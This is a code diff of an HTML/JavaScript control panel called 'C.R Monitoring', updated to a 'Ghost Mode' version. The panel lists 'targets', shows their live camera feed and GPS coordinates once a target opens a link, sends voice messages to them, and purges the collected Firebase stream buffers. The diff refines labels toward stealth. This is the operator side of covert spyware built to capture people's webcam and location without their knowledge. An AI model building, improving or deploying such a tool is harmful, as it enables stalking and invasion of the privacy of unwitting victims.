@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R Monitoring V1.5 - Pro Streamer</title>
+    <title>C.R Monitoring V1.6 - Ghost Mode</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
@@ -19,8 +19,8 @@
     <div class="max-w-6xl mx-auto">
         <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
             <div>
-                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.5</h1>
-                <p class="text-xs text-gray-500 text-green-400">STEALTH & OPTIMIZED MODE</p>
+                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.6</h1>
+                <p class="text-xs text-gray-500 text-green-400">GHOST STEALTH MODE ACTIVE</p>
             </div>
             <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
         </header>
@@ -28,45 +28,40 @@
         <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
             <!-- Target Status -->
             <div class="lg:col-span-1 border-r border-green-900 pr-4">
-                <h2 class="text-lg font-bold mb-4">ACTIVE TARGETS</h2>
+                <h2 class="text-lg font-bold mb-4 uppercase">Target List</h2>
                 <div id="victim-list" class="space-y-2">
-                    <div class="text-xs text-gray-600 italic">Listening for incoming connections...</div>
+                    <div class="text-[10px] text-gray-600 italic">Waiting for connection...</div>
                 </div>
             </div>
 
             <!-- Dashboard -->
             <div class="lg:col-span-3">
-                <div class="flex space-x-4 mb-4 border-b border-gray-800">
-                    <div class="tab-btn active" id="tab-live">LIVE FEED & INTEL</div>
-                </div>
-
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                     <!-- Video Section -->
                     <div class="glitch-border p-4 bg-black relative">
                         <div class="flex justify-between items-center mb-2">
-                            <span class="text-xs text-red-500 font-bold uppercase">Cam Stream</span>
-                            <span class="live-indicator" id="live-status">● IDLE</span>
+                            <span class="text-xs text-red-500 font-bold uppercase">Live Camera</span>
+                            <span class="live-indicator" id="live-status">● OFFLINE</span>
                         </div>
                         <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden">
                             <img id="stream-img" src="" class="hidden">
-                            <span id="placeholder" class="text-gray-700">Waiting for stream...</span>
+                            <span id="placeholder" class="text-gray-700 text-xs text-center p-4">Feed will appear when target opens the link.</span>
                         </div>
-                        <div class="mt-4 p-2 bg-gray-900 border border-green-900 rounded">
-                            <p class="text-[10px] text-green-500 uppercase font-bold mb-1">Geoloc Intel:</p>
-                            <p class="text-xs text-white" id="lat-long">Coords: 0.0, 0.0</p>
-                            <a id="map-link" href="#" target="_blank" class="text-[10px] text-blue-400 underline hidden mt-1">OPEN IN GOOGLE MAPS</a>
+                        <div class="mt-4 p-3 bg-gray-900 border border-green-900 rounded">
+                            <p class="text-[10px] text-green-500 uppercase font-bold mb-1">Location Data:</p>
+                            <p class="text-xs text-white font-mono" id="lat-long">0.0, 0.0</p>
+                            <a id="map-link" href="#" target="_blank" class="text-[10px] text-blue-400 underline hidden mt-2">VIEW ON GOOGLE MAPS</a>
                         </div>
                     </div>
 
                     <!-- Control Section -->
                     <div class="glitch-border p-4 bg-black flex flex-col">
                         <h3 class="text-blue-500 font-bold mb-2 uppercase text-sm">Voice Intercom</h3>
-                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2" placeholder="Ketik pesan suara ke target..."></textarea>
-                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-3 hover:bg-blue-700 transition-all uppercase text-xs">Broadcast Voice</button>
+                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2" placeholder="Send voice command to target..."></textarea>
+                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-3 hover:bg-blue-700 transition-all uppercase text-xs">Broadcast Sound</button>
                         
-                        <div class="mt-4 p-2 bg-red-900 bg-opacity-20 border border-red-900 rounded">
-                            <p class="text-[10px] text-red-500 font-bold">System Command:</p>
-                            <button id="purge-btn" class="text-[10px] text-white underline mt-1">Nuke All Stream Buffers</button>
+                        <div class="mt-4 pt-4 border-t border-gray-800">
+                            <button id="purge-btn" class="text-[9px] text-red-500 uppercase tracking-tighter hover:underline">Reset All Stream Buffers</button>
                         </div>
                     </div>
                 </div>
@@ -96,7 +91,7 @@
         onAuthStateChanged(auth, async (user) => {
             if (!user) await signInAnonymously(auth);
             else {
-                document.getElementById('auth-info').innerText = "CMD ACTIVE: " + user.uid;
+                document.getElementById('auth-info').innerText = "MONITOR ACTIVE | ID: " + user.uid.substring(0,6);
                 initMonitor();
             }
         });
@@ -112,21 +107,20 @@
                     const img = document.getElementById('stream-img');
                     const ph = document.getElementById('placeholder');
                     
-                    // Update Victim List
                     const v = document.createElement('div');
-                    v.className = "p-2 border border-green-900 text-[10px] bg-green-900 bg-opacity-10";
-                    v.innerText = `TARGET_${data.uid?.substring(0,6)} (LIVE)`;
+                    v.className = "p-2 border border-green-900 text-[10px] bg-green-900 bg-opacity-10 mb-1";
+                    v.innerText = `ACTIVE_TARGET_${data.uid?.substring(0,6)}`;
                     list.appendChild(v);
 
                     if (data.frame) {
                         img.src = data.frame;
                         img.classList.remove('hidden');
                         ph.classList.add('hidden');
-                        document.getElementById('live-status').innerText = "● STREAMING";
+                        document.getElementById('live-status').innerText = "● LIVE";
                     }
 
                     if (data.location) {
-                        document.getElementById('lat-long').innerText = `Coords: ${data.location.lat}, ${data.location.lng}`;
+                        document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
                         const mLink = document.getElementById('map-link');
                         mLink.href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
                         mLink.classList.remove('hidden');
@@ -148,7 +142,6 @@
         document.getElementById('purge-btn').onclick = async () => {
             const snap = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer'));
             snap.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', d.id)));
-            alert("Buffers cleared.");
         };
     </script>
 </body>
